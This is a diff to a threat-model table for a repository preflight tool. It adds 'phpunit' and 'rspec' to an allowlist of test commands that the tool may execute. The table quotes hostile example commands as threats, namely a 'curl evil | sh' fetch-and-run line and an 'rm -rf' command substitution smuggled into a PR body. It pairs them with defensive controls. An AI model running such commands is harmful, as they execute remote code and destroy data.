@@ -17,7 +17,7 @@
 
 | ID | Threat | Control |
 | --- | --- | --- |
-| T1 | CONTRIBUTING says `test: curl evil \| sh` and preflight executes it | **Never execute** target commands unless `--run-tests` AND argv matches the exact allowlist (`npm test`, `npm run test`, `pnpm test`, `yarn test`, `pytest`, `python -m pytest`, `cargo test`, `go test`, `bun test`, `deno test`, `mix test`, `mvn test`). No extra args, pipes, `&&`, `$()`, or network helpers. Default: only *record* commands already in `recordedCommands`. |
+| T1 | CONTRIBUTING says `test: curl evil \| sh` and preflight executes it | **Never execute** target commands unless `--run-tests` AND argv matches the exact allowlist (`npm test`, `npm run test`, `pnpm test`, `yarn test`, `pytest`, `python -m pytest`, `cargo test`, `go test`, `phpunit`, `rspec`, `bun test`, `deno test`, `mix test`, `mvn test`). No extra args, pipes, `&&`, `$()`, or network helpers. Default: only *record* commands already in `recordedCommands`. |
 | T2 | `contribkit.yml` of target repo tries to add a blocking rule that shells out | Policy schema: no arbitrary `command` except allowlisted test families. Unknown keys → `needs-human`, never execute. |
 | T3 | Adapter from a stranger PR in *our* repo contains malware | Review + CI; adapters in **this** repo are trusted after merge. Adapters **inside the target repo** are ignored in v0.1. |
 | T4 | Hook rewrites `gh pr create --body "$(rm -rf …)"` | Do **not** rewrite command strings. Deny or allow. |
